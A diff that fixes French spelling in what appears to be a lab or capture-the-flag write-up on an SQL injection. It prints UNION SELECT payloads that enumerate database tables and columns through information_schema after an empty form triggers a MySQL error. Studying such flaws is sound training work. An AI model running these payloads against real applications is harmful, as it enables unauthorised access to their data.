@@ -1,11 +1,11 @@
 # Recherches
 
-1. Envoie du formulaire vide retourne une erreur MySQL
-2. Ecrire un exploit afin de lister toutes les tables presentes
+1. Envoi du formulaire vide retourne une erreur MySQL
+2. Ecrire un exploit afin de lister toutes les tables présentes
    ```
    1 UNION SELECT table_schema, table_name FROM information_schema.tables
    ```
-3. Lister les colones
+3. Lister les colonnes
    ```
    1 UNION SELECT TABLE_NAME, COLUMN_NAME FROM information_schema.columns
    ```
@@ -22,7 +22,7 @@
 
 # Explications
 
-Les failles sql sont courrantes dans les applications qui ne securisent pas leurs entrees.
+Les failles sql sont courantes dans les applications qui ne sécurisent pas leurs entrées.
 
 # Corrections
 
